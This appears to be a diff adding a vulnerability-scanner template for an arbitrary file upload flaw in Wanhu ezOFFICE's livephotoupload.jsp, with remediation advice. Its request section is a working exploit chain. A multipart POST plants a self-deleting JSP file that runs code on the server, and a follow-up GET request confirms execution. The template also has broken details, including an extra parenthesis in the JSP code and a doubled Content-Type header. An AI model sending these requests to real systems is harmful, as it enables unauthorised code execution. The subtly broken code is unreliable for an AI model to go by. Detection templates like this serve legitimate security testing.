@@ -1,0 +1,72 @@
+id: wooyun-2014-063903
+info:
+  name: Wanhu ezOffice collaborative office management platform livephotoupload.jsp file upload vulnerability
+  author:
+  - 折跃
+  description: |-
+    Wanhu ezOFFICE livephotoupload.jsp arbitrary file upload vulnerability
+    Wanhu ezOFFICE collaborative office platform is an OA collaborative office software product.
+
+    Wanhu ezOFFICE contains an arbitrary file upload vulnerability. Remote attackers can exploit it to upload files and execute code.
+  severity: critical
+  remediation: |-
+    Official remedy:
+    1. It is recommended that users obtain the latest patch or the latest version program from the official website:
+    https://www.whir.net/
+
+    Temporary remedy:
+    1. On the server side, set the file upload directory directly as non-executable.
+    2. File type checking: it is recommended to use a whitelist approach (more reliable than a blacklist), combined with MIME type and extension checks (whitelist restriction on file types). In addition, for image processing, compression or resize functions can be used to destroy any embedded HTML code while processing the image.
+    3. Use random numbers to rewrite file names and file paths so that users cannot easily access their own uploaded files.
+    4. Set up a separate domain for the file server.
+    5. Validate file content and use regular expressions to match malicious code (filtering various bypass methods of malicious code, such as case variations and BASE64 encoding) to restrict uploads.
+    6. Fix any parsing vulnerabilities that may exist on the server.
+    7. Strictly restrict file uploads that can modify server configuration, such as .htaccess.
+    8. Hide the upload file path.
+    9. Fix the Web upload code in a timely manner.
+    10. There must not be a local file inclusion vulnerability.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code_1==200 && status_code_2==200
+    - contains(body_1,varName)
+    - contains(body_2,verify)
+  extractors:
+  - name: tmpFIle
+    type: regex
+    regex:
+    - goodsPicName\.value = "(.+?)";
+    group: 1
+    part: body
+    internal: true
+  raw:
+  - |
+    POST /defaultroot/public/jsp/livephotoupload.jsp?path=goodspic&mode=add&hiddenName=goodsPicName&visualName=goodsPicName HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=ffb3cc4faa19bf85108f166d3069705f
+
+    --ffb3cc4faa19bf85108f166d3069705f--
+    Content-Disposition: form-data; name="file1"; filename="{{varName}}.jsp"
+    Content-Type: Content-Type: application/octet-stream
+
+    <%
+    out.println(new String("{{verify}}")));
+    new java.io.File(application.getRealPath(request.getServletPath())).delete();
+    %>
+    --ffb3cc4faa19bf85108f166d3069705f--
+    Content-Disposition: form-data; name="submit"
+
+    --ffb3cc4faa19bf85108f166d3069705f--
+    Content-Disposition: form-data; name="continueUpload"
+
+    1
+    --ffb3cc4faa19bf85108f166d3069705f--
+  - |
+    GET /defaultroot/upload/information/{{tmpFIle}} HTTP/1.1
+    Host: {{Hostname}}
+  req-condition: true
+variables:
+  varName: '{{rand_text_alphanumeric(8,"")}}'
+  verify: '{{rand_text_alphanumeric(32,"")}}'
